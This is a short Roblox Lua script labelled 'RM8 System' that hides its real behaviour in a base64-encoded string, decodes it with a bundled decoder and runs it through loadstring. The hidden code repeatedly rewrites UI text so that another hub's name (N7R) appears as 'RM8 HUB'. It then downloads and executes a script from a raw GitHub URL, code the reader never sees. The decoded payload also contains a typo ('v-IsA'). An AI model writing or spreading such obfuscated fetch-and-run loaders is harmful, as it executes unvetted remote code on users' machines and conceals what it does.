# RM8
-- RM8 System
local _0x724d8 = "Y2hhbmdlTmFtZSA9IGZ1bmN0aW9uKHIpIGZvciBfLHYgaW4gcGFpcnMocjpHZXREZXNjZW5kYW50cygpKSBkbyBpZiB2OklzQSgnVGV4dExhYmVsJykgb3Igdi1Jc0EoJ1RleHRCdXR0b24nKSB0aGVuIHYuVGV4dCA9IHYuVGV4dDpnc3ViKCdON1InLCAnUk04Jykgdi5UZXh0ID0gdi5UZXh0OmdzdWIoJ9i5p9mE2YUg2KfZhNmF2YXZh9mD2KknLCAnUk04IEhVQicpIGVuZCBlbmQgZW5kIDsgc3Bhd24oZnVuY3Rpb24oKSB3aGlsZSB0YXNrLndhaXQoMC41KSBkbyBjaGFuZ2VOYW1lKGdhbWU6R2V0U2VydmljZSgnQ29yZUd1aScpKSBjaGFuZ2VOYW1lKGdhbWU6R2V0U2VydmljZSgnUGxheWVycycpLkxvY2FsUGxheWVyLlBsYXllclVpKSBlbmQgZW5kKSA7IGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20va2ttbWFpODIva2ttbWFpODIvcmVmcy9oZWFkcy9tYWluL0pkaCcpKSgp"
local function _0x524d(_0x61)
    local _0x62 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    _0x61 = string.gsub(_0x61, '[^'.._0x62..'=]', '')
    return (_0x61:gsub('.', function(_0x63)
        if (_0x63 == '=') then return '' end
        local _0x64, _0x65 = '', _0x62:find(_0x63) - 1
        for _0x66 = 6, 1, -1 do _0x64 = _0x64 .. (_0x65 % 2^_0x66 - _0x65 % 2^(_0x66 - 1) > 0 and '1' or '0') end
        return _0x64
    end):gsub('%d%d%d%d%d%d%d%d', function(_0x63)
        return string.char(tonumber(_0x63, 2))
    end))
end
loadstring(_0x524d(_0x724d8))()

